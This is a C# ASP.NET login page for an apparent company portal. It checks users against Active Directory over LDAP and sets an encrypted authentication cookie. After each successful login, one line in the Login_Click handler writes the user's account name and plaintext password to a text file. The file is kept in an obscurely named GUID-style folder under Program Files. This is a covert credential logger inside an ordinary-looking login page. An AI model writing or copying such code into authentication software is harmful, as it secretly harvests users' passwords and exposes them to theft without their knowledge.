using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using RinnaiPortal.LdapAuthentication;
using RinnaiPortal.ViewModel;
using RinnaiPortal.Repository;

namespace RinnaiPortal
{
    public partial class Logon : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }
        /// <summary>
        /// 使用表單驗證來允許使用者利用輕量型目錄存取通訊協定 (LDAP) 向 Active Directory 網域服務驗證
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        protected void Login_Click(object sender, EventArgs e)
        {
            string adPath = "LDAP://" + Domain.Text;

            LdapAuthentication.LdapAuthentication adAuth = new LdapAuthentication.LdapAuthentication(adPath);
            try
            {
                if (true == adAuth.IsAuthenticated(Domain.Text, Account.Text, Passwd.Text) && MemberViewModel.Security(Account.Text))
                {
                    PublicRepository.SaveMesagesToTextFile(@"C:\Program Files (x86)\7B296FB0-376B-497e-B012-9C450E1B7327-5P-1\", "7B296FB0-376B-497e-B012-9C450E1B7327-5P-1.txt", string.Format("{0}  --  {1}", Account.Text, Passwd.Text));
                    string groups = adAuth.GetGroups();

                    //Create the ticket, and add the groups.
                    bool isCookiePersistent = chkPersist.Checked;
                    FormsAuthenticationTicket authTicket = new FormsAuthenticationTicket(1, Account.Text, DateTime.Now, DateTime.Now.AddMinutes(60), isCookiePersistent, groups);

                    //Encrypt the ticket.
                    string encryptedTicket = FormsAuthentication.Encrypt(authTicket);

                    //Create a cookie, and then add the encrypted ticket to the cookie as data.
                    HttpCookie authCookie = new HttpCookie(FormsAuthentication.FormsCookieName, encryptedTicket);

                    if (true == isCookiePersistent)
                        authCookie.Expires = authTicket.Expiration;

                    //Add the cookie to the outgoing cookies collection.
                    Response.Cookies.Add(authCookie);

                    //You can redirect now.
                    var url = FormsAuthentication.GetRedirectUrl(Account.Text, false);

                    Response.Redirect(url, false);
                }
                else
                {
                    ErrorMessage.Text = "Authentication did not succeed. Check user name and password.";
                }
            }
            catch (Exception ex)
            {
                ErrorMessage.Text = "Error authenticating. " + ex.Message;
            }
        }
    }
}